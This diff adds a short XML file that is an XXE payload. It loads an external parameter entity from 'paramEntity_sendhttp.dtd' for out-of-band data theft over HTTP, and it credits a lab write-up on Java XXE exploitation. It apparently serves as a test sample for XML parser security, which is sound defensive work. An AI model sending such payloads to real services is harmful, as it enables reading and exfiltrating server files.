@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE a [
+<!ENTITY % asd SYSTEM "paramEntity_sendhttp.dtd"> 
+%asd; 
+%rrr; 
+]>
+<a></a>
+<!-- Source: http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html -->
+
+
